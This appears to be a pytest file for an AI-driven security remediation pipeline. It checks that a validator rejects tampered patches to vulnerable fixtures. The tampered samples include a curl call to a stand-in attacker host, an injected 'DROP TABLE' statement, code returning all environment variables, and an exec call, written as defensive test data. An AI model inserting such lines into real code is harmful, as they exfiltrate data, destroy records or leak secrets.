import ast

import pytest

from backend.app.scanner import (
    DeterministicSecurityScanner,
    RemediationAgent,
    SafePatchExecutor,
    ValidationAgent,
)
from backend.app.simulator import SCENARIOS


@pytest.mark.parametrize("scenario_name", list(SCENARIOS))
def test_each_authored_fixture_has_one_finding_and_exact_fix_removes_it(scenario_name):
    scenario = SCENARIOS[scenario_name]
    scanner = DeterministicSecurityScanner()
    executor = SafePatchExecutor()
    plan = RemediationAgent().propose(scenario)

    before_findings = scanner.scan(scenario, scenario.vulnerable_source)
    after = executor.apply(
        scenario, scenario.vulnerable_source,
        approved_action_id=plan.action_id, expected_action_id=plan.action_id,
        approved_patch_sha256=plan.patch_sha256, expected_patch_sha256=plan.patch_sha256,
        approved_fixed_source_sha256=plan.fixed_source_sha256,
        expected_fixed_source_sha256=plan.fixed_source_sha256,
    )
    after_findings = scanner.scan(scenario, after)

    assert len(before_findings) == 1
    assert before_findings[0].cwe == scenario.cwe
    assert after == scenario.fixed_source
    assert after_findings == []


def test_executor_rejects_any_source_not_matching_reviewed_hash():
    scenario = SCENARIOS["sql_injection"]
    plan = RemediationAgent().propose(scenario)
    with pytest.raises(ValueError, match="source changed"):
        SafePatchExecutor().apply(
            scenario, scenario.vulnerable_source + "\n# changed",
            approved_action_id=plan.action_id, expected_action_id=plan.action_id,
            approved_patch_sha256=plan.patch_sha256, expected_patch_sha256=plan.patch_sha256,
            approved_fixed_source_sha256=plan.fixed_source_sha256,
            expected_fixed_source_sha256=plan.fixed_source_sha256,
        )


@pytest.mark.parametrize("scenario_name", list(SCENARIOS))
def test_static_ast_validation_passes_without_importing_fixture(scenario_name):
    scenario = SCENARIOS[scenario_name]
    checks = ValidationAgent(DeterministicSecurityScanner()).validate(
        scenario, scenario.vulnerable_source, scenario.fixed_source
    )

    assert ast.parse(scenario.fixed_source)
    assert all(checks.values())


def test_validation_rejects_new_high_risk_construct():
    scenario = SCENARIOS["hardcoded_secret"]
    altered = scenario.fixed_source + "\nexec('print(1)')\n"
    checks = ValidationAgent(DeterministicSecurityScanner()).validate(
        scenario, scenario.vulnerable_source, altered
    )

    assert checks["no_obvious_new_high_risk_pattern"] is False


def test_validation_rejects_top_level_path_write_side_effect():
    scenario = SCENARIOS["sql_injection"]
    altered = scenario.fixed_source + "\nfrom pathlib import Path\nPath('marker').write_text('ran')\n"
    checks = ValidationAgent(DeterministicSecurityScanner()).validate(
        scenario, scenario.vulnerable_source, altered
    )

    assert checks["allow_list_policy"] is False
    assert checks["no_top_level_side_effects"] is False
    assert not all(checks.values())


def test_validation_rejects_public_signature_change():
    scenario = SCENARIOS["sql_injection"]
    altered = scenario.fixed_source.replace("def find_user(cursor, user_id):", "def find_user(cursor, user_id, tenant_id):")
    checks = ValidationAgent(DeterministicSecurityScanner()).validate(
        scenario, scenario.vulnerable_source, altered
    )

    assert checks["public_contract_preserved"] is False


def test_validation_rejects_extra_allow_listed_sql_execute():
    scenario = SCENARIOS["sql_injection"]
    altered = '''"""Altered remediation."""

def find_user(cursor, user_id):
    query = "SELECT id, email FROM users WHERE id = ?"
    cursor.execute("DROP TABLE audit_log")
    return cursor.execute(query, (user_id,)).fetchone()
'''
    checks = ValidationAgent(DeterministicSecurityScanner()).validate(
        scenario, scenario.vulnerable_source, altered
    )

    assert checks["exact_scenario_structure"] is False
    assert checks["allow_list_policy"] is False
    assert checks["safe_construct_present"] is False


def test_validation_rejects_extra_allow_listed_subprocess_call():
    scenario = SCENARIOS["command_injection"]
    altered = '''"""Altered remediation."""

import subprocess

def convert_image(input_path, output_path):
    subprocess.run(["curl", "https://attacker.invalid"], shell=False, check=True)
    return subprocess.run(["convert", input_path, output_path], shell=False, check=True)
'''
    checks = ValidationAgent(DeterministicSecurityScanner()).validate(
        scenario, scenario.vulnerable_source, altered
    )

    assert checks["exact_scenario_structure"] is False
    assert checks["allow_list_policy"] is False
    assert checks["safe_construct_present"] is False


def test_validation_rejects_environment_exfiltration_and_docstring_spoof():
    scenario = SCENARIOS["hardcoded_secret"]
    altered = '''"""Mentions os.environ["SERVICE_TOKEN"] only to spoof a text check."""

from os import environ

def auth_header():
    return environ
'''
    checks = ValidationAgent(DeterministicSecurityScanner()).validate(
        scenario, scenario.vulnerable_source, altered
    )

    assert checks["exact_scenario_structure"] is False
    assert checks["allow_list_policy"] is False
    assert checks["no_top_level_side_effects"] is False
    assert checks["safe_construct_present"] is False
